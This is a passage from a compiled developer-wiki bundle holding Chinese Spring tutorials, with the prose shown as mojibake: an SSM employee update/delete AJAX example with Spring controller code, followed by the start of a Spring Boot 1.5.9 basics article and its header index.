success:function(result){\n                //alert(result.msg);\n                //1ãå³é­å¯¹è¯æ¡\n                $("#empupdatemodal").modal("hide");\n                //2ãåå°æ¬é¡µé¢\n                to_page(currentpage);\n            }\n        });\n    });\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    \n\n 2. éè¦è®¾ç½®ä¸ä¸ªè¿æ»¤å¨ï¼ç¨äºå°ajaxè¯·æ±ä¸­çæ°æ®å°è£å°beanä¸­\n    \n    \n    <filter>\n        <filter-name>httpputformcontentfilter</filter-name>\n        <filter-class>org.springframework.web.filter.httpputformcontentfilter</filter-class>\n    </filter>\n    \n    <filter-mapping>\n        <filter-name>httpputformcontentfilter</filter-name>\n        <url-pattern>/*</url-pattern>\n    </filter-mapping>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n 3. åå°ç¼åå¤çè¯·æ±çç¸å³æ¹æ³\n    \n    /**\n         * å¦æç´æ¥åéajax=putå½¢å¼çè¯·æ±\n         * å°è£çæ°æ®\n         * employee\n         * [empid=1014, empname=null, gender=null, email=null, did=null]\n         *\n         * é®é¢ï¼\n         * è¯·æ±ä½ä¸­ææ°æ®ï¼\n         * ä½æ¯employeeå¯¹è±¡å°è£ä¸ä¸ï¼\n         * update tbl_emp  where emp_id = 1014;\n         *\n         * åå ï¼\n         * tomcatï¼\n         * \t\t1ãå°è¯·æ±ä½ä¸­çæ°æ®ï¼å°è£ä¸ä¸ªmapã\n         * \t\t2ãrequest.getparameter("empname")å°±ä¼ä»è¿ä¸ªmapä¸­åå¼ã\n         * \t\t3ãspringmvcå°è£pojoå¯¹è±¡çæ¶åã\n         * \t\t\t\tä¼æpojoä¸­æ¯ä¸ªå±æ§çå¼ï¼request.getparamter("email");\n         * ajaxåéputè¯·æ±å¼åçè¡æ¡ï¼\n         * \t\tputè¯·æ±ï¼è¯·æ±ä½ä¸­çæ°æ®ï¼request.getparameter("empname")æ¿ä¸å°\n         * \t\ttomcatä¸çæ¯putä¸ä¼å°è£è¯·æ±ä½ä¸­çæ°æ®ä¸ºmapï¼åªæpostå½¢å¼çè¯·æ±æå°è£è¯·æ±ä½ä¸ºmap\n         * org.apache.catalina.connector.request--parseparameters() (3111);\n         *\n         * protected string parsebodymethods = "post";\n         * if( !getconnector().isparsebodymethod(getmethod()) ) {\n         success = true;\n         return;\n         }\n         *\n         *\n         * è§£å³æ¹æ¡ï¼\n         * æä»¬è¦è½æ¯æç´æ¥åéputä¹ç±»çè¯·æ±è¿è¦å°è£è¯·æ±ä½ä¸­çæ°æ®\n         * 1ãéç½®ä¸httpputformcontentfilterï¼\n         * 2ãä»çä½ç¨ï¼å°è¯·æ±ä½ä¸­çæ°æ®è§£æåè£æä¸ä¸ªmapã\n         * 3ãrequestè¢«éæ°åè£ï¼request.getparameter()è¢«éåï¼å°±ä¼ä»èªå·±å°è£çmapä¸­åæ°æ®\n         * åå·¥æ´æ°æ¹æ³\n         * @param employee\n         * @return\n         */\n    @responsebody\n    @requestmapping(value="/emp/{empid}",method=requestmethod.put)\n    public msg saveemp(employee employee, httpservletrequest request){\n        system.out.println("è¯·æ±ä½ä¸­çå¼ï¼"+request.getparameter("gender"));\n        system.out.println("å°è¦æ´æ°çåå·¥æ°æ®ï¼"+employee);\n        employeeservice.updateemp(employee);\n        return msg.success()\t;\n    }\n    \n    /**\n    \t * åå·¥æ´æ°\n    \t * @param employee\n    \t */\n    public void updateemp(employee employee) {\n        // todo auto-generated method stub\n        employeemapper.updatebyprimarykeyselective(employee);\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    50\n    51\n    52\n    53\n    54\n    55\n    \n\n\n# å é¤åå·¥ä¿¡æ¯\n\n 1. ajaxåèµ·å é¤åå·¥è¯·æ±\n    \n    //åä¸ªå é¤\n    $(document).on("click",".delete_btn",function(){\n        //1ãå¼¹åºæ¯å¦ç¡®è®¤å é¤å¯¹è¯æ¡\n        var empname = $(this).parents("tr").find("td:eq(2)").text();\n        var empid = $(this).attr("del-id");\n        //alert($(this).parents("tr").find("td:eq(1)").text());\n        if(confirm("ç¡®è®¤å é¤ã"+empname+"ãåï¼")){\n            //ç¡®è®¤ï¼åéajaxè¯·æ±å é¤å³å¯\n            $.ajax({\n                url:"${app_path}/emp/"+empid,\n                type:"delete",\n                success:function(result){\n                    alert(result.msg);\n                    //åå°æ¬é¡µ\n                    to_page(currentpage);\n                }\n            });\n        }\n    });\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    \n\n 2. åç«¯ç¼åæ¹æ³å¤çè¯·æ±\n    \n    /**\n    \t * åä¸ªæ¹éäºåä¸\n    \t * æ¹éå é¤ï¼1-2-3\n    \t * åä¸ªå é¤ï¼1\n    \t * \n    \t * @param id\n    \t * @return\n    \t */\n    @responsebody\n    @requestmapping(value="/emp/{ids}",method=requestmethod.delete)\n    public msg deleteemp(@pathvariable("ids")string ids){\n        //æ¹éå é¤\n        if(ids.contains("-")){\n            list<integer> del_ids = new arraylist<>();\n            string[] str_ids = ids.split("-");\n            //ç»è£idçéå\n            for (string string : str_ids) {\n                del_ids.add(integer.parseint(string));\n            }\n            employeeservice.deletebatch(del_ids);\n        }else{\n            integer id = integer.parseint(ids);\n            employeeservice.deleteemp(id);\n        }\n        return msg.success();\n    }\n    \n    /**\n         * åå·¥å é¤\n         * @param id\n         */\n    public void deleteemp(integer id) {\n        // todo auto-generated method stub\n        employeemapper.deletebyprimarykey(id);\n    }\n    \n    public void deletebatch(list<integer> ids) {\n        // todo auto-generated method stub\n        employeeexample example = new employeeexample();\n        employeeexample.criteria criteria = example.createcriteria();\n        //delete from xxx where emp_id in(1,2,3)\n        criteria.andempidin(ids);\n        employeemapper.deletebyexample(example);\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    \n\n 3. è®¾ç½®æ¹éå é¤åå·¥ajaxè¯·æ±\n    \n    //å®æå¨é/å¨ä¸éåè½\n    $("#check_all").click(function(){\n        //attrè·åcheckedæ¯undefined;\n        //æä»¬è¿äºdomåççå±æ§ï¼attrè·åèªå®ä¹å±æ§çå¼ï¼\n        //propä¿®æ¹åè¯»ådomåçå±æ§çå¼\n        $(".check_item").prop("checked",$(this).prop("checked"));\n    });\n    \n    //check_item\n    $(document).on("click",".check_item",function(){\n        //å¤æ­å½åéæ©ä¸­çåç´ æ¯å¦5ä¸ª\n        var flag = $(".check_item:checked").length==$(".check_item").length;\n        $("#check_all").prop("checked",flag);\n    });\n    \n    //ç¹å»å¨é¨å é¤ï¼å°±æ¹éå é¤\n    $("#emp_delete_all_btn").click(function(){\n        //\n        var empnames = "";\n        var del_idstr = "";\n        $.each($(".check_item:checked"),function(){\n            //this\n            empnames += $(this).parents("tr").find("td:eq(2)").text()+",";\n            //ç»è£åå·¥idå­ç¬¦ä¸²\n            del_idstr += $(this).parents("tr").find("td:eq(1)").text()+"-";\n        });\n        //å»é¤empnameså¤ä½ç,\n        empnames = empnames.substring(0, empnames.length-1);\n        //å»é¤å é¤çidå¤ä½ç-\n        del_idstr = del_idstr.substring(0, del_idstr.length-1);\n        if(confirm("ç¡®è®¤å é¤ã"+empnames+"ãåï¼")){\n            //åéajaxè¯·æ±å é¤\n            $.ajax({\n                url:"${app_path}/emp/"+del_idstr,\n                type:"delete",\n                success:function(result){\n                    alert(result.msg);\n                    //åå°å½åé¡µé¢\n                    to_page(currentpage);\n                }\n            });\n        }\n    });\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    \n\n\n# æ»ç»\n\n',charsets:{cjk:!0},lastUpdated:"2022/05/16, 15:55:31",lastUpdatedTimestamp:1652716531e3},{title:"Springboot1 åºç¡ç¯",frontmatter:{title:"Springboot1 åºç¡ç¯",date:"2022-04-28T03:11:00.000Z",permalink:"/dev/java/core/springbootbase",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","å¾®æå¡æ ¸å¿"],tags:["Springboot","Spring","SpringMVC"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1011.%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A0%B8%E5%BF%83/05.Springboot.html",relativePath:"01.å¼å/101.åç«¯/1011.å¾®æå¡æ ¸å¿/05.Springboot.md",key:"v-1a3c5af6",path:"/dev/java/core/springbootbase/",headers:[{level:2,title:"Springbootç®ä»",slug:"springbootç®ä»",normalizedTitle:"springbootç®ä»",charIndex:31},{level:3,title:"å¾®æå¡",slug:"å¾®æå¡",normalizedTitle:"å¾®æå¡",charIndex:407},{level:2,title:"HelloWorld",slug:"helloworld",normalizedTitle:"helloworld",charIndex:808},{level:2,title:"Springbootéç½®æä»¶",slug:"springbootéç½®æä»¶",normalizedTitle:"springbootéç½®æä»¶",charIndex:7080},{level:3,title:"YAMLè¯­æ³",slug:"yamlè¯­æ³",normalizedTitle:"yamlè¯­æ³",charIndex:7218},{level:3,title:"éç½®æä»¶å¼å¯¼å¥JavaBean",slug:"éç½®æä»¶å¼å¯¼å¥javabean",normalizedTitle:"éç½®æä»¶å¼å¯¼å¥javabean",charIndex:7641},{level:3,title:"å¶ä»è·åå¼çæ¹æ³",slug:"å¶ä»è·åå¼çæ¹æ³",normalizedTitle:"å¶ä»è·åå¼çæ¹æ³",charIndex:10780},{level:3,title:"éç½®æä»¶æ³¨å¥å¼æ°æ®æ ¡éª",slug:"éç½®æä»¶æ³¨å¥å¼æ°æ®æ ¡éª",normalizedTitle:"éç½®æä»¶æ³¨å¥å¼æ°æ®æ ¡éª",charIndex:11380},{level:3,title:"@PropertieSource",slug:"propertiesource",normalizedTitle:"@propertiesource",charIndex:11932},{level:3,title:"éç½®æä»¶å ä½ç¬¦",slug:"éç½®æä»¶å ä½ç¬¦",normalizedTitle:"éç½®æä»¶å ä½ç¬¦",charIndex:12519},{level:3,title:"profileå¤ç¯å¢æ¯æ",slug:"profileå¤ç¯å¢æ¯æ",normalizedTitle:"profileå¤ç¯å¢æ¯æ",charIndex:12885},{level:3,title:"ymlå¤ææ¡£åæ¨¡å¼",slug:"ymlå¤ææ¡£åæ¨¡å¼",normalizedTitle:"ymlå¤ææ¡£åæ¨¡å¼",charIndex:13175},{level:3,title:"éç½®æä»¶çå è½½",slug:"éç½®æä»¶çå è½½",normalizedTitle:"éç½®æä»¶çå è½½",charIndex:13390},{level:3,title:"èªå¨éç½®åç",slug:"èªå¨éç½®åç",normalizedTitle:"èªå¨éç½®åç",charIndex:14437},{level:3,title:"Springbootçç²¾é«",slug:"springbootçç²¾é«",normalizedTitle:"springbootçç²¾é«",charIndex:20574},{level:3,title:"@Conditionalæ´¾çæ³¨è§£",slug:"conditionalæ´¾çæ³¨è§£",normalizedTitle:"@conditionalæ´¾çæ³¨è§£",charIndex:20769},{level:2,title:"æ¥å¿",slug:"æ¥å¿",normalizedTitle:"æ¥å¿",charIndex:24083},{level:3,title:"SLF4Jçä½¿ç¨æ¹æ³",slug:"slf4jçä½¿ç¨æ¹æ³",normalizedTitle:"slf4jçä½¿ç¨æ¹æ³",charIndex:24967},{level:3,title:"æ¥å¿çç»ä¸",slug:"æ¥å¿çç»ä¸",normalizedTitle:"æ¥å¿çç»ä¸",charIndex:25391},{level:3,title:"springbootçæ¥å¿å³ç³»",slug:"springbootçæ¥å¿å³ç³»",normalizedTitle:"springbootçæ¥å¿å³ç³»",charIndex:25604},{level:3,title:"æ¥å¿çä½¿ç¨æ¹æ³",slug:"æ¥å¿çä½¿ç¨æ¹æ³",normalizedTitle:"æ¥å¿çä½¿ç¨æ¹æ³",charIndex:26354},{level:3,title:"æ¥å¿éç½®æä»¶",slug:"æ¥å¿éç½®æä»¶",normalizedTitle:"æ¥å¿éç½®æä»¶",charIndex:27762},{level:3,title:"åæ¢æ¥å¿æ¡æ¶ä¸ºslf4j+log4j",slug:"åæ¢æ¥å¿æ¡æ¶ä¸ºslf4j-log4j",normalizedTitle:"åæ¢æ¥å¿æ¡æ¶ä¸ºslf4j+log4j",charIndex:29117},{level:3,title:"åæ¢æ¥å¿æ¡æ¶slf4j+log4j2",slug:"åæ¢æ¥å¿æ¡æ¶slf4j-log4j2",normalizedTitle:"åæ¢æ¥å¿æ¡æ¶slf4j+log4j2",charIndex:29834},{level:2,title:"Webå¼å",slug:"webå¼å",normalizedTitle:"webå¼å",charIndex:30393},{level:3,title:"Springbootå¯¹éæèµæºçå¤ç",slug:"springbootå¯¹éæèµæºçå¤ç",normalizedTitle:"springbootå¯¹éæèµæºçå¤ç",charIndex:30482},{level:3,title:"Thymeleafæ¨¡æ¿å¼æ",slug:"thymeleafæ¨¡æ¿å¼æ",normalizedTitle:"thymeleafæ¨¡æ¿å¼æ",charIndex:35212},{level:3,title:"SpringMVCèªå¨éç½®",slug:"springmvcèªå¨éç½®",normalizedTitle:"springmvcèªå¨éç½®",charIndex:39578},{level:3,title:"ä¿®æ¹Spingbooté»è®¤éç½®",slug:"ä¿®æ¹spingbooté»è®¤éç½®",normalizedTitle:"ä¿®æ¹spingbooté»è®¤éç½®",charIndex:44483},{level:3,title:"RestFulCRUD",slug:"restfulcrud",normalizedTitle:"restfulcrud",charIndex:44712},{level:3,title:"spring éè¯¯å¤çæºå¶",slug:"spring-éè¯¯å¤çæºå¶",normalizedTitle:"spring éè¯¯å¤çæºå¶",charIndex:70444},{level:3,title:"åµå¥å¼Webå®¹å¨",slug:"åµå¥å¼webå®¹å¨",normalizedTitle:"åµå¥å¼webå®¹å¨",charIndex:77989},{level:3,title:"èªå¨éç½®åç",slug:"èªå¨éç½®åç-2",normalizedTitle:"èªå¨éç½®åç",charIndex:14437},{level:3,title:"åµå¥å¼Servletå®¹å¨å¯å¨åç",slug:"åµå¥å¼servletå®¹å¨å¯å¨åç",normalizedTitle:"åµå¥å¼servletå®¹å¨å¯å¨åç",charIndex:87334},{level:3,title:"ä½¿ç¨å¤ç½®çServletå®¹å¨",slug:"ä½¿ç¨å¤ç½®çservletå®¹å¨",normalizedTitle:"ä½¿ç¨å¤ç½®çservletå®¹å¨",charIndex:90536},{level:3,title:"å¤ç½®Servletåç",slug:"å¤ç½®servletåç",normalizedTitle:"å¤ç½®servletåç",charIndex:91288},{level:2,title:"Springbootæ°æ®äº¤äº",slug:"springbootæ°æ®äº¤äº",normalizedTitle:"springbootæ°æ®äº¤äº",charIndex:95690},{level:3,title:"JDBC",slug:"jdbc",normalizedTitle:"jdbc",charIndex:24393},{level:3,title:"æ°æ®äº¤äºéç½®åç",slug:"æ°æ®äº¤äºéç½®åç",normalizedTitle:"æ°æ®äº¤äºéç½®åç",charIndex:97758},{level:3,title:"Druidæ°æ®æº",slug:"druidæ°æ®æº",normalizedTitle:"druidæ°æ®æº",charIndex:100316},{level:3,title:"æ´åmybatis",slug:"æ´åmybatis",normalizedTitle:"æ´åmybatis",charIndex:104041},{level:3,title:"æ´åJPA",slug:"æ´åjpa",normalizedTitle:"æ´åjpa",charIndex:111898},{level:2,title:"Springboot å¯å¨éç½®åç",slug:"springboot-å¯å¨éç½®åç",normalizedTitle:"springboot å¯å¨éç½®åç",charIndex:115322},{level:3,title:"å¯å¨æµç¨ï¼",slug:"å¯å¨æµç¨",normalizedTitle:"å¯å¨æµç¨ï¼",charIndex:115344},{level:3,title:"äºä»¶çå¬æºå¶",slug:"äºä»¶çå¬æºå¶",normalizedTitle:"äºä»¶çå¬æºå¶",charIndex:118211},{level:2,title:"Springbootèªå®ä¹starter",slug:"springbootèªå®ä¹starter",normalizedTitle:"springbootèªå®ä¹starter",charIndex:118377},{level:3,title:"æ­¥éª¤",slug:"æ­¥éª¤",normalizedTitle:"æ­¥éª¤",charIndex:118974}],headersStr:"Springbootç®ä» å¾®æå¡ HelloWorld Springbootéç½®æä»¶ YAMLè¯­æ³ éç½®æä»¶å¼å¯¼å¥JavaBean å¶ä»è·åå¼çæ¹æ³ éç½®æä»¶æ³¨å¥å¼æ°æ®æ ¡éª @PropertieSource éç½®æä»¶å ä½ç¬¦ profileå¤ç¯å¢æ¯æ ymlå¤ææ¡£åæ¨¡å¼ éç½®æä»¶çå è½½ èªå¨éç½®åç Springbootçç²¾é« @Conditionalæ´¾çæ³¨è§£ æ¥å¿ SLF4Jçä½¿ç¨æ¹æ³ æ¥å¿çç»ä¸ springbootçæ¥å¿å³ç³» æ¥å¿çä½¿ç¨æ¹æ³ æ¥å¿éç½®æä»¶ åæ¢æ¥å¿æ¡æ¶ä¸ºslf4j+log4j åæ¢æ¥å¿æ¡æ¶slf4j+log4j2 Webå¼å Springbootå¯¹éæèµæºçå¤ç Thymeleafæ¨¡æ¿å¼æ SpringMVCèªå¨éç½® ä¿®æ¹Spingbooté»è®¤éç½® RestFulCRUD spring éè¯¯å¤çæºå¶ åµå¥å¼Webå®¹å¨ èªå¨éç½®åç åµå¥å¼Servletå®¹å¨å¯å¨åç ä½¿ç¨å¤ç½®çServletå®¹å¨ å¤ç½®Servletåç Springbootæ°æ®äº¤äº JDBC æ°æ®äº¤äºéç½®åç Druidæ°æ®æº æ´åmybatis æ´åJPA Springboot å¯å¨éç½®åç å¯å¨æµç¨ï¼ äºä»¶çå¬æºå¶ Springbootèªå®ä¹starter æ­¥éª¤",content:'# SpringBoot åºç¡ - åºäº 1.5.9\n\n\n# Springbootç®ä»\n\nSpringbootæ¯ç®åSpringåºç¨å¼åçä¸ä¸ªæ¡æ¶ï¼å¶ä¸­æ´åäºSpringææ¯æ ï¼æ¯J2EEå¼åçä¸ç«å¼è§£å³æ¹æ¡ãå¨ä¼ ç»çåºäºSSMæ¡æ¶è¿è¡é¡¹ç®å¼åçè¿ç¨ä¸­ï¼æä»¬éè¦éç½®å¤§éçéç½®æä»¶ï¼ç¨äºçº¦ææ¡æ¶çåè½åéç½®ãSpringbootåºäºâçº¦å®å¤§äºéç½®âçå¼åææ³ï¼åä¸ªç»ä»¶çéç½®æä»¶ç±Springbootå¸®å©æä»¬å®æï¼æä»¬åªéè¦å°éçéç½®å³å¯æ­å»ºä¸ä¸ªé¡¹ç®å¼åçåºæ¬ç¯å¢ï¼æ´ä¸æ³¨äºä¸å¡ä»£ç çç¼åã\n\nä½¿ç¨Springbootçä¼ç¹ï¼\n\n * å¿«éåå»ºç¬ç«è¿è¡çSpringåºç¨ï¼å¹¶å¯ä»¥éæä¸»æµçæ¡æ¶\n * ä½¿ç¨åµå¥å¼çServletå®¹å¨ï¼åºç¨æ éæWarå\n * ä½¿ç¨startersè¿è¡èªå¨ä¾èµåçæ¬æ§å¶\n * ä¸»æµæ¡æ¶çèªå¨é»è®¤éç½®ï¼æ ä»£ç çæï¼å¼ç®±å³ç¨\n * åçäº§ç¯å¢çè¿è¡æ¶çæ§\n * å¤©ç¶éæäºè®¡ç®\n\n\n# å¾®æå¡\n\n> martinfowler.com\n\nå¾®æå¡æ¯å½åé¡¹ç®å¼åçç­ç¹ãåé¡¾ä¼ ç»çåä½åºç¨å¼åï¼æä»¬æ´ä¸ªé¡¹ç®é»è®¤æ¯é¨ç½²å¨åä¸å°æå¡å¨ä¸çï¼æä»¬å°ç¼åå¥½çé¡¹ç®ææwaråï¼æ¾å°tomcatä¸­è¿è¡ãå¨ç¨æ·éè¾å°ãé¡¹ç®è¾ä¸ºç®åçåºæ¯ä¸æ²¡æä»ä¹å¼å¸¸ï¼é¨ç½²èµ·æ¥ä¹ç¸å¯¹æ¹ä¾¿ãä½æ¯å¦æé¡¹ç®çè®¿é®éè¾å¤§ï¼æä»¬æå¡å¨çèµæºååè¾å¤§ï¼åä½åºç¨å°±æ æ³æ¯æèµ·ç¨æ·çéæ±ãå¨è¿ç§æåµä¸ï¼æä»¬éå¸¸ä¼å°é¡¹ç®é¨ç½²å¨å¤ä¸ªæå¡å¨ä¸ï¼ç¶åä½¿ç¨è´è½½åè¡¡å°ç¨æ·çè®¿é®åéå°ä¸åçæå¡å¨ä¸ãé£ä¹ï¼å¦æåªæ¯åä¸ªåè½è®¿é®éè¾å¤§ï¼æ¯å¦ï¼è®¢ååè½ãä¼ååè½ï¼è¿ç§æ¹å¼å°±ä¼å¯¼è´æå¡å¨çèµæºæµªè´¹ãå¾®æå¡çææ³åºè¿èçã\n\n\n\næè°å¾®æå¡ï¼å°±æ¯å°åæ¬çåä½åºç¨æ½ç¦»åºå¤ä¸ªåè½æ¨¡åï¼æ¯ä¸ªåè½æ¨¡åé½å¯ä»¥åç¬é¨ç½²ãå¦ææä¸ªæ¨¡åçè®¿é®è¦æ±è¾é«ï¼å°ä¸åæ¨¡åä¹é´çå¨æç»åï¼é¨ç½²å°å¶ä»æå¡å¨ä¸ãæ¯ä¸ªåè½æ¨¡åé½æ¯å¯ä»¥ç¬ç«æ¿æ¢åç¬ç«åçº§çååãå¦ä¸å¾æç¤ºï¼\n\n\n\n\n# HelloWorld\n\n# helloworldç¼å\n\n> æµè§å¨åéhelloè¯·æ±ï¼æå¡å¨æ¥æ¶è¯·æ±å¹¶å°helloworldè¿åç»æµè§å¨ã\n\n 1. åå»ºMavenå·¥ç¨ï¼å¹¶å¯¼å¥springbootç¸å³ä¾èµã\n    \n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>1.5.9.RELEASE</version>\n    </parent>\n    \n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n        </dependency>\n    </dependencies>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    \n\n 2. ç¼åä¸»ç¨åºï¼ç¨äºå¯å¨springbootåºç¨\n    \n    package com.pwddd;\n    \n    import org.springframework.boot.SpringApplication;\n    import org.springframework.boot.autoconfigure.SpringBootApplication;\n    \n    @SpringBootApplication\n    public class SpringBootTestApplication {\n        public static void main(String[] args) {\n            SpringApplication.run(SpringBootTestApplication.class,args);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    \n\n 3. ç¼åcontrollerå¤çç¨æ·è¯·æ±\n    \n    package com.pwddd.controller;\n    \n    import org.springframework.stereotype.Controller;\n    import org.springframework.web.bind.annotation.GetMapping;\n    import org.springframework.web.bind.annotation.ResponseBody;\n    \n    @Controller\n    public class HelloController {\n    \n        @GetMapping("/hello")\n        @ResponseBody\n        public String hello(){\n            return "helloworld";\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    \n\n 4. è¿è¡ä¸»ç¨åº\n\n 5. Springbootåºç¨æå\n    \n    * å¯¼å¥Springbooté¡¹ç®æä»¶\n      \n      <build>\n          <plugins>\n              <plugin>\n                  <groupId>org.springframework.boot</groupId>\n                  <artifactId>spring-boot-maven-plugin</artifactId>\n              </plugin>\n          </plugins>\n      </build>\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      \n    \n    * è¿è¡maven -> package\n    \n    * java -jarè¿è¡\n\n# helloworldè§£æ\n\n# ç¶é¡¹ç®çæ¬ä»²è£\n\nå¨åå»ºMavené¡¹ç®ä¸­ï¼æå®äºMavençç¶é¡¹ç®ã\n\n<parent>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-parent</artifactId>\n    <version>1.5.9.RELEASE</version>\n</parent>\n\n\n1\n2\n3\n4\n5\n\n\nè¯¥ç¶é¡¹ç®åæå®äºå¦ä¸ä¸ªç¶é¡¹ç®ã\n\n<parent>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-dependencies</artifactId>\n    <version>1.5.9.RELEASE</version>\n    <relativePath>../../spring-boot-dependencies</relativePath>\n</parent>\n\n\n1\n2\n3\n4\n5\n6\n\n\nè¿ä¸ªç¶é¡¹ç®ä¸­å¶å®äºç¸å³ç»ä»¶ççæ¬ã\n\n<properties>\n    \x3c!-- Dependency versions --\x3e\n    <activemq.version>5.14.5</activemq.version>\n    <antlr2.version>2.7.7</antlr2.version>\n    â¦â¦â¦â¦\n\n\n1\n2\n3\n4\n5\n\n\n# åºæ¯å¯å¨å¨\n\nspringboot starteræ¯springbootçåºæ¯å¯å¨å¨ï¼å¸®æä»¬å¯¼å¥äºç¸å³æ¨¡åè¿è¡çç¸å³ä¾èµãspringbootå°å¸¸è§çåè½åºæ¯æ½ç¦»åºæ¥ï¼æä»¬ä½¿ç¨æ¶åªéè¦å¼ç¨ç¸å³çåºæ¯å¯å¨å¨ï¼springbootä¼å¸®æä»¬èªå¨å¯¼å¥ç¸å³çä¾èµã\n\n# springbootåºç¨çå¯å¨\n\nå¨Springbootå¯å¨ç±»ä¸æ@SpringBootApplicationæ³¨è§£ï¼è¯¥æ³¨è§£è¯´æäºè¯¥ç±»æ¯å½åé¡¹ç®çä¸»éç½®ç±»ï¼springbooté¡¹ç®å¯ä»¥è¿è¡è¯¥ç±»çmainæ¹æ³å¯å¨é¡¹ç®ãè¯¥æ³¨è§£æ¯ä¸ä¸ªç»åæ³¨è§£ï¼ååå«äºä»¥ä¸çåå®¹ã\n\n@Target({ElementType.TYPE})\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\n@Inherited\n@SpringBootConfiguration\n@EnableAutoConfiguration\n@ComponentScan(\n    excludeFilters = {@Filter(\n    type = FilterType.CUSTOM,\n    classes = {TypeExcludeFilter.class}\n), @Filter(\n    type = FilterType.CUSTOM,\n    classes = {AutoConfigurationExcludeFilter.class}\n)}\n)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n@SpringBootConfigurationæ³¨è§£ï¼æ æ³¨springbootçéç½®ç±»ã\n\n@EnableAutoConfigurationæ³¨è§£ï¼å¼å¯äºèªå¨éç½®çåè½ãä¹åå¨ä½¿ç¨SSMæ¡æ¶æ¶ï¼éè¦èªå·±å¯¼å¥ç¸å³çä¾èµåéç½®ï¼å¼å¯èªå¨éç½®ä¹åå°±å¯ä»¥èªå¨å®æç¸å³éç½®ã\n\nå¨è¯¥æ³¨è§£ä¸­ï¼åå«äºä»¥ä¸çæ³¨è§£åå®¹ï¼\n\n@Target({ElementType.TYPE})\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\n@Inherited\n@AutoConfigurationPackage\n@Import({EnableAutoConfigurationImportSelector.class})\npublic @interface EnableAutoConfiguration {\n    String ENABLED_OVERRIDE_PROPERTY = "spring.boot.enableautoconfiguration";\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n@AutoConfigurationPackage: èªå¨éç½®å\n\nèªå¨éç½®åç±å¦ä¸çæ³¨è§£ç»æï¼\n\n@Target({ElementType.TYPE})\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\n@Inherited\n@Import({Registrar.class})\npublic @interface AutoConfigurationPackage {\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n@Import({Registrar.class}): Importæ¯Springåºå±çæ³¨è§£ï¼è¯¥æ³¨è§£ç»å®¹å¨ä¸­å¯¼å¥ä¸ä¸ªç»ä»¶ãå¯¼å¥ç»ä»¶ç±Registrarå®ä¹ãè¯¥ç±»å°Applicationä¸»éç½®ç±»æå¨åä¸çææå­åä¸­çç»ä»¶æ·»å æ«æå°Springå®¹å¨ä¸­ã\n\n public void registerBeanDefinitions(AnnotationMetadata metadata, BeanDefinitionRegistry registry) {\n            AutoConfigurationPackages.register(registry, (new AutoConfigurationPackages.PackageImport(metadata)).getPackageName());\n        }\n\n\n1\n2\n3\n\n\nEnableAutoConfigurationImportSelectorï¼èªå¨éç½®å¯¼å¥çéæ©å¨ãå°ææéè¦å¯¼å¥çç»ä»¶ä»¥å¨ç±»åçæ¹å¼è¿åï¼è¿äºç»ä»¶å°±ä¼è¢«æ·»å å°å®¹å¨ä¸­ã\n\npublic String[] selectImports(AnnotationMetadata annotationMetadata) {\n    if (!this.isEnabled(annotationMetadata)) {\n        return NO_IMPORTS;\n    } else {\n        try {\n            AutoConfigurationMetadata autoConfigurationMetadata = AutoConfigurationMetadataLoader.loadMetadata(this.beanClassLoader);\n            AnnotationAttributes attributes = this.getAttributes(annotationMetadata);\n            List<String> configurations = this.getCandidateConfigurations(annotationMetadata, attributes);\n            configurations = this.removeDuplicates(configurations);\n            configurations = this.sort(configurations, autoConfigurationMetadata);\n            Set<String> exclusions = this.getExclusions(annotationMetadata, attributes);\n            this.checkExcludedClasses(configurations, exclusions);\n            configurations.removeAll(exclusions);\n            configurations = this.filter(configurations, 